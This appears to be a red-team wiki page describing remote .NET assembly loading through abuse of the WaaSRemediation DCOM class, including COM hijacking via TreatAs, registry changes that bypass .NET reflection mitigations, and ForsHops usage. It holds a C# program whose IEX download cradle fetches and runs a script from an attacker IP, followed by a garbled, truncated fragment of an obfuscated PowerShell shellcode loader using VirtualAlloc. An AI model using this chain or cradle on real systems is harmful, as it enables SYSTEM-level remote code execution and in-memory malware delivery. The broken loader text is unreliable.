# Remote .NET Assembly Loading through WaaSRemediation DCOM Abuse

## Theory

The **`IDispatch`** interface exposed in the **`WaaSRemediation`** COM class, can be manipulated for trapped COM object abuse and .NET code execution. **`WaaSRemediation`** is implemented in the **`WaaSMedicSvc`** service, which executes as a [**Protected Process Light (PPL)**](https://learn.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-#system-protected-process) **svchost.exe** process in the context of NT AUTHORITY\SYSTEM. This technique was discovered In February 2025 by James Forshaw ([@tiraniddo](https://x.com/tiraniddo)) from Google Project Zero&#x20;

Fore more information about [COM ](https://learn.microsoft.com/en-us/windows/win32/com/com-technical-overview)and DCOM, check [this page](../../pivoting/dcom.md).

#### Trapped COM Objects

A trapped COM object is a bug class in which a COM client instantiates a COM class in an out-of-process DCOM server, where the client controls the COM object via a marshaled-by-reference object pointer. Depending on the condition, this control vector may present security-related logic flaws.

#### IDispatch

The [IDispatch](https://learn.microsoft.com/en-us/windows/win32/api/oaidl/nn-oaidl-idispatch) interfaces  facilitates late binding to methods and properties of COM objects.  Unlike traditional COM clients that use compile-time interface definitions, late binding allows clients to discover and call methods dynamically at runtime

The [IDispatch](https://learn.microsoft.com/en-us/windows/win32/api/oaidl/nn-oaidl-idispatch) interface support the following methods:

* `GetTypeInfoCount` : returns 0 or 1 if the object provides type information.
* `GetTypeInfo` : Provides access to an `ITypeInfo` interface for retrieving type information of an object.
* `GetIDsOfNames` : takes human-readable names (such as "Workbooks") and returns a number (known as a dispatch identifier or dispID) that maps to the object's associated method or property.
* `Invoke` : Once you have the dispID number, you use Invoke to call the method or retrieve property data.

Via `ITypeLib` from `GetTypeInfo->ITypeInfo->GetContainingTypeLib` ,a client can retrieve type information of a COM class that use a type library.

In our case, the, **`WaaSRemediation`** references the type library **`WaaSRemediationLib`,** which in turn references **`stdole`** (OLE Automation). **`WaaSRemediationLib`** utilizes two COM classes from that library, **`StdFont`** and **`StdPicture`**. By performing [COM Hijacking](https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/) on the **`StdFont`** object via modifying its **`TreatAs`** registry key, the class will point to another COM class of our choosing, such as **`System.Object`** in the .NET Framework.

.NET objects are interesting to us because of **`System.Object`**â€™s **`GetType`** method. Through **`GetType`,** we can perform .NET reflection to eventually access **`Assembly.Load`**. While **`System.Object`** was chosen, this type happens to be the root of the type hierarchy in .NET. Therefore, any .NET COM object could be used.

#### **AllowDCOMReflection**

To leverage this technique, we need to enable the `AllowDCOMReflection` (DWORD) value under the `HKLM\Software\Microsoft\.NetFramework` registry key.  This setting allows arbitrary reflection to call any .NET method, bypassing the mitigations in MS14-009 that typically prevent .NET reflection over DCOM.

#### **OnlyUseLatestCLR**

To ensure the correct version of the .NET CLR is loaded, we must also enable the `OnlyUseLatestCLR` (DWORD) value under the `HKLM\Software\Microsoft\.NetFramework` registry key.  This setting ensures the latest .NET CLR (version 4) is loaded, as the default is version 2 unless explicitly enabled.

#### ForsHops

To leverage the previously explained method, we can use the [ForsHops](https://github.com/xforcered/ForsHops) (C#) proof-of-concept.

```
forshops.exe [target machine] [c:\\path\\to\\assembly\\to\\load]
```

#### POC Demo

In this demo, we will use the below C# code that loads a[ custom PowerShell runspace](https://red.infiltr8.io/redteam/weapon/code-execution/whithout-powershell) to retrieve and execute a second-stage payload directly in memory.

{% code title="GetRev.cs" %}
```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

class Program
{
    static void Main()
    {
        string command = "IEX(New-Object Net.WebClient).DownloadString('http://192.168.206.126/run.txt')";

        using (Runspace runspace = RunspaceFactory.CreateRunspace())
        {
            runspace.Open();
            using (PowerShell ps = PowerShell.Create())
            {
                ps.Runspace = runspace;
                ps.AddScript(command);

                foreach (var result in ps.Invoke())
                {
                    Console.WriteLine(result);
                }
            }
        }
    }
}
```
{% endcode %}

After compiling our malicious .NET as GetRev.exe,  we host the following run.txt file on our attacking machine:

return $turnips[0].Invoke($null, @(($tomatoes.GetMethod('GetModuleHandle')).Invoke($null, @($cherries)), $pineapple))
}
function apples {

return $type.CreateType()

$cucumbers = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll VirtualAlloc), (apples @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
